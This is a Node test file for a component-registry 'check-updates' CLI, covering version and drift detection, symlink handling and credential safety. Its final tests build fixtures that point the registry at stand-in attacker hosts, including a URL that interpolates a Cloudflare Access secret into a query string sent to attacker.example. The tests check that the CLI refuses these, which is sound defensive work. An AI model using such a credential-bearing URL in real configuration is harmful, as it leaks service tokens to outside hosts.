// Node test (no vitest in this package) for `vegastack-design check-updates`.
// Run: node test/check-updates.test.mjs  (wired into `pnpm test` for @vegastack/design).
//
// Stubs global fetch (no network) and builds a throwaway consumer project on disk with copied-in
// component files carrying provenance headers, then drives main() and asserts the comparison,
// output shape, exit codes, env-expansion, index-url derivation, and config precedence.
import assert from "node:assert/strict";
import {
  mkdtempSync,
  mkdirSync,
  readFileSync,
  writeFileSync,
  rmSync,
  symlinkSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { main } from "../bin/check-updates.mjs";
import { itemHash } from "../bin/verify-registry-item.mjs";

let passed = 0;
async function t(name, fn) {
  try {
    await fn();
    passed++;
  } catch (e) {
    console.error(`✗ ${name}\n  ${e.stack || e.message}`);
    process.exitCode = 1;
  }
}

process.env.TEST_TOKEN = "s3cr3t";
process.env.VEGASTACK_TRUSTED_REGISTRY_ORIGIN = "https://example.test";

// ── stub fetch: serve a fixed index, record the last request ───────────────────────────────────
const BTN_OLD = "sha256-AAAAbbbbCCCCddddEEEE1111++//==";
let BTN_NEW = "sha256-ZZZZyyyyXXXXwwwwVVVV9999++//==";
let DLG_SAME = "sha256-DLGdlgDLGdlg0000111122223333==";
const BUTTON_CONTENT = `// @vegastack button@0.2.0 sha256-REMOTE==\n\nexport const Button = () => 'v2';\n`;
const DIALOG_CONTENT = `// @vegastack dialog@0.2.0 sha256-REMOTE==\n\nexport const Dialog = () => null;\n`;
// input/card: headerless-consumer cases (the REAL `shadcn add` strips provenance headers)
const INPUT_CONTENT = `// @vegastack input@0.2.0 sha256-INPUTinput00001111==\n\nimport { cn } from '@vegastack/design';\nexport const Input = () => null;\n`;
const CARD_CONTENT = `// @vegastack card@0.2.0 sha256-CARDcard000011112222==\n\nexport const Card = () => 'v2';\n`;
const INDEX = {
  items: [
    {
      name: "button",
      files: [{ target: "@ui/button.tsx" }],
      meta: { version: "0.2.0", integrity: BTN_NEW },
    },
    {
      name: "dialog",
      files: [{ target: "@ui/dialog.tsx" }],
      meta: { version: "0.2.0", integrity: DLG_SAME },
    },
    {
      name: "input",
      files: [{ target: "@ui/input.tsx" }],
      meta: { version: "0.2.0", integrity: "sha256-INPUTinput00001111==" },
    },
    {
      name: "card",
      files: [{ target: "@ui/card.tsx" }],
      meta: { version: "0.2.0", integrity: "sha256-CARDcard000011112222==" },
    },
    {
      name: "terminal",
      files: [{ target: "@ui/terminal.tsx" }],
      meta: { version: "0.2.0", integrity: "sha256-TERMINAL==" },
    },
    {
      name: "icon-terminal",
      files: [{ target: "@ui/icons/terminal.tsx" }],
      meta: { version: "0.2.0", integrity: "sha256-ICONTERMINAL==" },
    },
    {
      name: "icon-a-arrow-down",
      files: [{ target: "@ui/icons/a-arrow-down.tsx", type: "registry:ui" }],
      meta: { version: "0.2.0", integrity: "sha256-ICONARROWDOWN==" },
    },
    {
      name: "region-select",
      files: [
        { target: "@ui/region-select.tsx" },
        { target: "@ui/region-select-data.ts" },
      ],
      meta: { version: "0.2.0", integrity: "sha256-REGION==" },
    },
    {
      name: "broken",
      files: [{ target: "@ui/broken.tsx" }],
      meta: { version: "0.2.0", integrity: "sha256-BROKEN==" },
    },
    // 'gone' intentionally absent → "missing"
  ],
};
const ITEMS = {
  button: {
    name: "button",
    files: [
      {
        path: "packages/ui/registry/ui/button.tsx",
        target: "@ui/button.tsx",
        content: BUTTON_CONTENT,
      },
    ],
  },
  dialog: {
    name: "dialog",
    files: [
      {
        path: "packages/ui/registry/ui/dialog.tsx",
        target: "@ui/dialog.tsx",
        content: DIALOG_CONTENT,
      },
    ],
  },
  input: {
    name: "input",
    files: [
      {
        path: "packages/ui/registry/ui/input.tsx",
        target: "@ui/input.tsx",
        content: INPUT_CONTENT,
      },
    ],
  },
  card: {
    name: "card",
    files: [
      {
        path: "packages/ui/registry/ui/card.tsx",
        target: "@ui/card.tsx",
        content: CARD_CONTENT,
      },
    ],
  },
  terminal: {
    name: "terminal",
    files: [
      {
        target: "@ui/terminal.tsx",
        content: `export const Terminal = () => null;\n`,
      },
    ],
  },
  "icon-terminal": {
    name: "icon-terminal",
    files: [
      {
        target: "@ui/icons/terminal.tsx",
        content: `export const TerminalIcon = () => null;\n`,
      },
    ],
  },
  "icon-a-arrow-down": {
    name: "icon-a-arrow-down",
    files: [
      {
        target: "@ui/icons/a-arrow-down.tsx",
        type: "registry:ui",
        content:
          "// Mirrored from upstream.\n// Do not edit directly.\n\nexport const AArrowDownIcon = () => null;\n",
      },
    ],
  },
  "region-select": {
    name: "region-select",
    files: [
      {
        target: "@ui/region-select.tsx",
        content: `export const RegionSelect = () => null;\n`,
      },
      {
        target: "@ui/region-select-data.ts",
        content: `export const regions = [];\n`,
      },
    ],
  },
};
for (const [name, item] of Object.entries(ITEMS)) {
  item.meta = { version: "0.2.0" };
  item.meta.integrity = itemHash(item);
  if (name === "button") BTN_NEW = item.meta.integrity;
  if (name === "dialog") DLG_SAME = item.meta.integrity;
  const indexItem = INDEX.items.find((entry) => entry.name === name);
  if (indexItem) indexItem.meta.integrity = item.meta.integrity;
}
let lastFetch = null;
let firstFetch = null; // the index fetch (item fetches for headerless files follow it)
globalThis.fetch = async (url, init) => {
  lastFetch = { url, headers: init?.headers ?? {}, redirect: init?.redirect };
  if (String(url).endsWith("/registry.json")) firstFetch = lastFetch;
  const m = /\/([a-z0-9-]+)\.json$/.exec(String(url));
  const name = m?.[1];
  if (name && name !== "registry" && ITEMS[name]) {
    return {
      ok: true,
      status: 200,
      statusText: "OK",
      json: async () => ITEMS[name],
    };
  }
  if (name && name !== "registry" && !ITEMS[name]) {
    return {
      ok: false,
      status: 404,
      statusText: "Not Found",
      json: async () => ({}),
    };
  }
  return { ok: true, status: 200, statusText: "OK", json: async () => INDEX };
};

// ── build a throwaway consumer project ───────────────────────────────────────────────────────────
function makeProject() {
  const root = mkdtempSync(join(tmpdir(), "vega-cu-"));
  writeFileSync(
    join(root, "components.json"),
    JSON.stringify({
      aliases: { ui: "@/components/ui" },
      registries: {
        "@vegastack": {
          url: "https://example.test/r/{name}.json",
          headers: { "X-Token": "${TEST_TOKEN}" },
        },
      },
    }),
  );
  const ui = join(root, "components", "ui");
  mkdirSync(ui, { recursive: true });
  // button: header hash differs from index → UPDATE
  writeFileSync(
    join(ui, "button.tsx"),
    `// @vegastack button@0.1.0 ${BTN_OLD}\nexport const Button = () => null;\n`,
  );
  // dialog: header hash and normalized body match the current item → CURRENT
  writeFileSync(
    join(ui, "dialog.tsx"),
    `// @vegastack dialog@0.1.0 ${DLG_SAME}\n\nexport const Dialog = () => null;\n`,
  );
  // gone: not in index → MISSING
  writeFileSync(
    join(ui, "gone.tsx"),
    `// @vegastack gone@0.1.0 sha256-GONEgone000011112222==\nexport const Gone = () => null;\n`,
  );
  // plain: no provenance header AND not a registry name → ignored (the consumer's own file)
  writeFileSync(join(ui, "plain.tsx"), `export const Plain = () => null;\n`);
  // input: HEADERLESS (real shadcn add strips the header) but content matches the item → CURRENT
  writeFileSync(
    join(ui, "input.tsx"),
    `import { cn } from '@vegastack/design';\nexport const Input = () => null;\n`,
  );
  // card: HEADERLESS and content differs from the item → DRIFT
  writeFileSync(
    join(ui, "card.tsx"),
    `export const Card = () => 'LOCALLY EDITED';\n`,
  );
  return root;
}

// capture console output + return the exit code from main()
async function run(args) {
  const logs = [];
  const errs = [];
  const ol = console.log;
  const oe = console.error;
  console.log = (...a) => logs.push(a.join(" "));
  console.error = (...a) => errs.push(a.join(" "));
  let code;
  try {
    code = await main(args);
  } finally {
    console.log = ol;
    console.error = oe;
  }
  return { code, out: logs.join("\n"), err: errs.join("\n") };
}

const root = makeProject();
try {
  await t(
    "value-taking flags reject missing values and never consume another flag",
    async () => {
      for (const args of [
        ["--cwd"],
        ["--filter", "--fail-on-update"],
        ["--registry", "--json"],
        ["--dir", "--no-color"],
      ]) {
        const { code, err } = await run(args);
        assert.equal(code, 2);
        assert.match(err, /requires a value/);
      }
    },
  );

  await t(
    "component scan skips symlink cycles and stays inside the selected directory",
    async () => {
      const ui = join(root, "components", "ui");
      const cycle = join(ui, "cycle");
      symlinkSync(ui, cycle, "dir");
      try {
        const { code, out } = await run(["--cwd", root, "--json"]);
        assert.equal(code, 0);
        assert.equal(JSON.parse(out).checked, 5);
      } finally {
        rmSync(cycle, { force: true });
      }
    },
  );

  await t("component scan rejects a symlinked scan root", async () => {
    const external = mkdtempSync(join(tmpdir(), "vega-cu-external-"));
    const linkedRoot = join(root, "linked-ui");
    mkdirSync(join(external, "nested"), { recursive: true });
    symlinkSync(external, linkedRoot, "dir");
    try {
      const { code, err } = await run([
        "--cwd",
        root,
        "--dir",
        "linked-ui",
        "--json",
      ]);
      assert.equal(code, 2);
      assert.match(err, /refusing to scan a symlinked component root/);
    } finally {
      rmSync(linkedRoot, { force: true });
      rmSync(external, { recursive: true, force: true });
    }
  });

  await t(
    "malformed and duplicate registry-index items fail cleanly",
    async () => {
      const originalItems = INDEX.items;
      try {
        for (const items of [
          [null],
          [{ name: "button", files: {}, meta: { version: "0.2.0" } }],
          [originalItems[0], { ...originalItems[0] }],
        ]) {
          INDEX.items = items;
          const { code, err } = await run(["--cwd", root, "--json"]);
          assert.equal(code, 2);
          assert.match(err, /registry index contains/);
        }
      } finally {
        INDEX.items = originalItems;
      }
    },
  );

  await t(
    "headerless target mapping distinguishes a component from its icon basename",
    async () => {
      const p = mkdtempSync(join(tmpdir(), "vega-cu-icons-"));
      mkdirSync(join(p, "components", "ui", "icons"), { recursive: true });
      writeFileSync(
        join(p, "components.json"),
        JSON.stringify({
          aliases: { ui: "@/components/ui" },
          registries: { "@vegastack": "https://example.test/r/{name}.json" },
        }),
      );
      writeFileSync(
        join(p, "components", "ui", "terminal.tsx"),
        `export const Terminal = () => null;\n`,
      );
      writeFileSync(
        join(p, "components", "ui", "icons", "terminal.tsx"),
        `export const TerminalIcon = () => null;\n`,
      );
      try {
        const { code, out } = await run(["--cwd", p, "--json"]);
        assert.equal(code, 0);
        const result = JSON.parse(out);
        assert.deepEqual(result.items.map(({ name }) => name).sort(), [
          "icon-terminal",
          "terminal",
        ]);
        assert.equal(
          result.items.every(({ status }) => status === "current"),
          true,
        );
      } finally {
        rmSync(p, { recursive: true, force: true });
      }
    },
  );

  await t(
    "headerless animated icon matches after real shadcn leading-comment removal",
    async () => {
      const p = mkdtempSync(join(tmpdir(), "vega-cu-icon-prologue-"));
      mkdirSync(join(p, "components", "ui", "icons"), { recursive: true });
      writeFileSync(
        join(p, "components.json"),
        JSON.stringify({
          aliases: { ui: "@/components/ui" },
          registries: { "@vegastack": "https://example.test/r/{name}.json" },
        }),
      );
      writeFileSync(
        join(p, "components", "ui", "icons", "a-arrow-down.tsx"),
        "export const AArrowDownIcon = () => null;\n",
      );
      try {
        const { code, out } = await run(["--cwd", p, "--json"]);
        assert.equal(code, 0);
        assert.equal(JSON.parse(out).items[0].status, "current");
      } finally {
        rmSync(p, { recursive: true, force: true });
      }
    },
  );

  await t(
    "headerless multi-file items compare every registry target",
    async () => {
      const p = mkdtempSync(join(tmpdir(), "vega-cu-multifile-"));
      mkdirSync(join(p, "components", "ui"), { recursive: true });
      writeFileSync(
        join(p, "components.json"),
        JSON.stringify({
          aliases: { ui: "@/components/ui" },
          registries: { "@vegastack": "https://example.test/r/{name}.json" },
        }),
      );
      writeFileSync(
        join(p, "components", "ui", "region-select.tsx"),
        `export const RegionSelect = () => null;\n`,
      );
      writeFileSync(
        join(p, "components", "ui", "region-select-data.ts"),
        `export const regions = [];\n`,
      );
      writeFileSync(
        join(p, "components", "ui", "region-select-data.ts"),
        `export const regions = ['local drift'];\n`,
      );
      try {
        const { code, out } = await run([
          "--cwd",
          p,
          "--json",
          "--fail-on-update",
        ]);
        assert.equal(code, 1);
        const result = JSON.parse(out);
        assert.equal(result.items[0].name, "region-select");
        assert.equal(result.items[0].status, "drift");
      } finally {
        rmSync(p, { recursive: true, force: true });
      }
    },
  );

  await t(
    "fetched item omitting an indexed target fails as a registry error",
    async () => {
      const originalFiles = ITEMS["region-select"].files;
      ITEMS["region-select"].files = originalFiles.slice(0, 1);
      const p = mkdtempSync(join(tmpdir(), "vega-cu-omitted-target-"));
      mkdirSync(join(p, "components", "ui"), { recursive: true });
      writeFileSync(
        join(p, "components.json"),
        JSON.stringify({
          aliases: { ui: "@/components/ui" },
          registries: { "@vegastack": "https://example.test/r/{name}.json" },
        }),
      );
      writeFileSync(
        join(p, "components", "ui", "region-select.tsx"),
        `export const RegionSelect = () => null;\n`,
      );
      writeFileSync(
        join(p, "components", "ui", "region-select-data.ts"),
        `export const regions = [];\n`,
      );
      try {
        const { code, out } = await run(["--cwd", p, "--json"]);
        assert.equal(code, 2);
        assert.equal(JSON.parse(out).items[0].status, "error");
      } finally {
        ITEMS["region-select"].files = originalFiles;
        rmSync(p, { recursive: true, force: true });
      }
    },
  );

  await t(
    "fetched item duplicate targets fail as a registry error",
    async () => {
      const originalFiles = ITEMS["region-select"].files;
      ITEMS["region-select"].files = [
        originalFiles[0],
        { ...originalFiles[0] },
      ];
      const p = mkdtempSync(join(tmpdir(), "vega-cu-duplicate-target-"));
      mkdirSync(join(p, "components", "ui"), { recursive: true });
      writeFileSync(
        join(p, "components.json"),
        JSON.stringify({
          aliases: { ui: "@/components/ui" },
          registries: { "@vegastack": "https://example.test/r/{name}.json" },
        }),
      );
      writeFileSync(
        join(p, "components", "ui", "region-select.tsx"),
        `export const RegionSelect = () => null;\n`,
      );
      writeFileSync(
        join(p, "components", "ui", "region-select-data.ts"),
        `export const regions = [];\n`,
      );
      try {
        const { code, out } = await run(["--cwd", p, "--json"]);
        assert.equal(code, 2);
        assert.equal(JSON.parse(out).items[0].status, "error");
      } finally {
        ITEMS["region-select"].files = originalFiles;
        rmSync(p, { recursive: true, force: true });
      }
    },
  );

  await t(
    "fetched item integrity mismatch fails as a registry error",
    async () => {
      const originalIntegrity = ITEMS.input.meta.integrity;
      ITEMS.input.meta.integrity = "sha256-tampered";
      try {
        const { code, out } = await run([
          "--cwd",
          root,
          "--json",
          "--filter",
          "input",
        ]);
        assert.equal(code, 2);
        assert.equal(JSON.parse(out).items[0].status, "error");
      } finally {
        ITEMS.input.meta.integrity = originalIntegrity;
      }
    },
  );

  await t(
    "per-item fetch failures are errors, not overwrite recommendations",
    async () => {
      const p = mkdtempSync(join(tmpdir(), "vega-cu-fetch-error-"));
      mkdirSync(join(p, "components", "ui"), { recursive: true });
      writeFileSync(
        join(p, "components.json"),
        JSON.stringify({
          aliases: { ui: "@/components/ui" },
          registries: { "@vegastack": "https://example.test/r/{name}.json" },
        }),
      );
      writeFileSync(
        join(p, "components", "ui", "broken.tsx"),
        `export const Broken = () => null;\n`,
      );
      try {
        const { code, out } = await run(["--cwd", p, "--json"]);
        assert.equal(code, 2);
        const result = JSON.parse(out);
        assert.equal(result.errors, 1);
        assert.equal(result.items[0].status, "error");
      } finally {
        rmSync(p, { recursive: true, force: true });
      }
    },
  );

  await t(
    "default run: reports update/drift/current/missing, exit 0",
    async () => {
      lastFetch = null;
      const { code, out } = await run(["--cwd", root, "--no-color"]);
      assert.equal(code, 0);
      assert.match(out, /button\s+0\.1\.0 → 0\.2\.0\s+update available/);
      // dialog's hash matches the index (content identical) → up to date, even though the GLOBAL
      // version bumped to 0.2.0. It shows the local version (0.1.0) — re-pulling yields identical bytes.
      assert.match(out, /dialog\s+0\.1\.0\s+up to date/);
      assert.match(out, /gone\s+0\.1\.0\s+not in registry/);
      assert.doesNotMatch(out, /plain/); // headerless AND not a registry name → ignored
      // headerless consumer copies (real shadcn add strips headers):
      assert.match(out, /input\s+.*up to date/); // content matches item minus header
      assert.match(out, /card\s+.*differs from registry/); // content diverged → drift
      assert.match(out, /3 actionable change\(s\) found/); // update + drift + removed item
      assert.match(out, /remove or migrate them deliberately/);
    },
  );

  await t(
    "index url derived ({name}->registry) + ${ENV} header expanded",
    async () => {
      firstFetch = null;
      await run(["--cwd", root, "--no-color"]);
      assert.equal(firstFetch.url, "https://example.test/r/registry.json");
      assert.equal(firstFetch.headers["X-Token"], "s3cr3t");
      assert.equal(firstFetch.redirect, "error");
    },
  );

  await t(
    "--json: shape + counts + statuses (incl. headerless drift/current)",
    async () => {
      const { code, out } = await run(["--cwd", root, "--json"]);
      assert.equal(code, 0);
      const j = JSON.parse(out);
      assert.equal(j.checked, 5);
      assert.equal(j.updates, 3); // button (update) + card (drift) + gone (removed)
      const by = Object.fromEntries(j.items.map((i) => [i.name, i.status]));
      assert.equal(by.button, "update");
      assert.equal(by.dialog, "current");
      assert.equal(by.gone, "missing");
      assert.equal(by.input, "current"); // headerless, content-matched
      assert.equal(by.card, "drift"); // headerless, content diverged
    },
  );

  await t("--fail-on-update: exit 1 when stale", async () => {
    const { code } = await run(["--cwd", root, "--json", "--fail-on-update"]);
    assert.equal(code, 1);
  });

  await t(
    "--fail-on-update: a removed registry item alone exits 1",
    async () => {
      const { code, out } = await run([
        "--cwd",
        root,
        "--json",
        "--filter",
        "gone",
        "--fail-on-update",
      ]);
      assert.equal(code, 1);
      assert.equal(JSON.parse(out).items[0].status, "missing");
    },
  );

  await t(
    "a retained current provenance header cannot hide an edited body",
    async () => {
      const file = join(root, "components", "ui", "dialog.tsx");
      const original = readFileSync(file, "utf8");
      try {
        writeFileSync(
          file,
          `// @vegastack dialog@0.2.0 ${DLG_SAME}\n\nexport const Dialog = () => 'BACKDOORED';\n`,
        );
        const { code, out } = await run([
          "--cwd",
          root,
          "--json",
          "--filter",
          "dialog",
          "--fail-on-update",
        ]);
        assert.equal(code, 1);
        const result = JSON.parse(out);
        assert.equal(result.items[0].status, "drift");
      } finally {
        writeFileSync(file, original);
      }
    },
  );

  await t("--filter narrows the set", async () => {
    const { out } = await run(["--cwd", root, "--json", "--filter", "button"]);
    const j = JSON.parse(out);
    assert.equal(j.checked, 1);
    assert.equal(j.items[0].name, "button");
  });

  await t("--registry overrides components.json (precedence)", async () => {
    firstFetch = null;
    await run([
      "--cwd",
      root,
      "--no-color",
      "--registry",
      "https://other.test/r/{name}.json",
    ]);
    assert.equal(firstFetch.url, "https://other.test/r/registry.json");
  });

  await t(
    "credentialed --registry refuses an origin outside the independent trust anchor",
    async () => {
      firstFetch = null;
      process.env.CF_ACCESS_CLIENT_ID = "id";
      process.env.CF_ACCESS_CLIENT_SECRET = "secret";
      try {
        const { code, err } = await run([
          "--cwd",
          root,
          "--no-color",
          "--registry",
          "https://attacker.test/r/{name}.json",
        ]);
        assert.equal(code, 2);
        assert.match(err, /refusing to send registry credentials/);
        assert.equal(firstFetch, null, "origin must be rejected before fetch");
      } finally {
        delete process.env.CF_ACCESS_CLIENT_ID;
        delete process.env.CF_ACCESS_CLIENT_SECRET;
      }
    },
  );

  await t(
    "checkout-local dotenv cannot override the credential trust anchor",
    async () => {
      const p = mkdtempSync(join(tmpdir(), "vega-cu-untrusted-origin-"));
      mkdirSync(join(p, "components", "ui"), { recursive: true });
      writeFileSync(
        join(p, ".env.local"),
        "VEGASTACK_TRUSTED_REGISTRY_ORIGIN=https://attacker.test\nLOCAL_TOKEN=secret\n",
      );
      writeFileSync(
        join(p, "components.json"),
        JSON.stringify({
          aliases: { ui: "@/components/ui" },
          registries: {
            "@vegastack": {
              url: "https://attacker.test/r/{name}.json",
              headers: { "X-Token": "${LOCAL_TOKEN}" },
            },
          },
        }),
      );
      writeFileSync(
        join(p, "components", "ui", "button.tsx"),
        `// @vegastack button@0.1.0 ${BTN_OLD}\nx\n`,
      );
      firstFetch = null;
      try {
        const { code, err } = await run(["--cwd", p, "--json"]);
        assert.equal(code, 2);
        assert.match(err, /trusted origin is https:\/\/example\.test/);
        assert.equal(
          firstFetch,
          null,
          "dotenv-selected origin must be rejected before fetch",
        );
      } finally {
        rmSync(p, { recursive: true, force: true });
      }
    },
  );

  await t("no components found → exit 0 with message", async () => {
    const empty = mkdtempSync(join(tmpdir(), "vega-cu-empty-"));
    writeFileSync(
      join(empty, "components.json"),
      JSON.stringify({
        aliases: { ui: "@/components/ui" },
        registries: { "@vegastack": "https://example.test/r/{name}.json" },
      }),
    );
    try {
      const { code, out } = await run(["--cwd", empty, "--no-color"]);
      assert.equal(code, 0);
      assert.match(out, /No VegaStack components found/);
    } finally {
      rmSync(empty, { recursive: true, force: true });
    }
  });

  await t(".env.local is loaded for ${ENV} expansion (G1)", async () => {
    const p = mkdtempSync(join(tmpdir(), "vega-cu-env-"));
    mkdirSync(join(p, "components", "ui"), { recursive: true });
    writeFileSync(join(p, ".env.local"), '# token\nCF_FROM_FILE="filevalue"\n');
    writeFileSync(
      join(p, "components.json"),
      JSON.stringify({
        aliases: { ui: "@/components/ui" },
        registries: {
          "@vegastack": {
            url: "https://example.test/r/{name}.json",
            headers: { "X-Tok": "${CF_FROM_FILE}" },
          },
        },
      }),
    );
    writeFileSync(
      join(p, "components", "ui", "button.tsx"),
      `// @vegastack button@0.1.0 ${BTN_OLD}\nx\n`,
    );
    try {
      await run(["--cwd", p, "--json"]);
      assert.equal(lastFetch.headers["X-Tok"], "filevalue"); // expanded from .env.local, not process.env
    } finally {
      rmSync(p, { recursive: true, force: true });
    }
  });

  await t("src/ components dir fallback (G2)", async () => {
    const p = mkdtempSync(join(tmpdir(), "vega-cu-src-"));
    mkdirSync(join(p, "src", "components", "ui"), { recursive: true });
    writeFileSync(
      join(p, "components.json"),
      JSON.stringify({
        aliases: { ui: "@/components/ui" },
        registries: { "@vegastack": "https://example.test/r/{name}.json" },
      }),
    );
    writeFileSync(
      join(p, "src", "components", "ui", "button.tsx"),
      `// @vegastack button@0.1.0 ${BTN_OLD}\nx\n`,
    );
    try {
      const { out } = await run(["--cwd", p, "--json"]);
      const j = JSON.parse(out);
      assert.equal(j.checked, 1); // found under src/ even though aliases.ui = @/components/ui
      assert.equal(j.items[0].name, "button");
    } finally {
      rmSync(p, { recursive: true, force: true });
    }
  });

  await t(
    "missing components.json without --registry/--dir → exit 2",
    async () => {
      const bare = mkdtempSync(join(tmpdir(), "vega-cu-bare-"));
      try {
        const { code, err } = await run(["--cwd", bare]);
        assert.equal(code, 2);
        assert.match(err, /no components\.json/);
      } finally {
        rmSync(bare, { recursive: true, force: true });
      }
    },
  );
  // A components.json declaring NO headers skipped the trusted-origin check entirely, so a registry
  // URL with the token interpolated into the query string was fetched — proven end-to-end against a
  // local sink that received a Cloudflare Access service token over plain http while the CLI exited 0.
  // These assert the request is never made AND that the token never reaches stderr (i.e. CI logs).
  await t(
    "a secret interpolated into the registry URL is refused and never fetched",
    async () => {
      const previous = process.env.CF_ACCESS_CLIENT_SECRET;
      process.env.CF_ACCESS_CLIENT_SECRET = "example-service-token-not-real";
      const leaky = mkdtempSync(join(tmpdir(), "vega-leak-"));
      try {
        mkdirSync(join(leaky, "components", "ui"), { recursive: true });
        writeFileSync(
          join(leaky, "components.json"),
          JSON.stringify({
            aliases: { ui: "@/components/ui" },
            registries: {
              "@vegastack":
                "http://attacker.example/r/{name}.json?k=${CF_ACCESS_CLIENT_SECRET}",
            },
          }),
        );
        lastFetch = null;
        const { code, err } = await run(["--cwd", leaky]);
        assert.equal(code, 2, "must fail closed");
        assert.equal(
          lastFetch,
          null,
          "no request may be issued for a credential-bearing URL",
        );
        assert.match(
          err,
          /refusing to put \$\{CF_ACCESS_CLIENT_SECRET\} in a registry URL/,
        );
        assert.ok(
          !err.includes("example-service-token-not-real"),
          "the secret must be redacted from output, not echoed into logs",
        );
      } finally {
        if (previous == null) delete process.env.CF_ACCESS_CLIENT_SECRET;
        else process.env.CF_ACCESS_CLIENT_SECRET = previous;
        rmSync(leaky, { recursive: true, force: true });
      }
    },
  );
} finally {
  rmSync(root, { recursive: true, force: true });
}

console.log(`check-updates.test: ${passed} passed`);
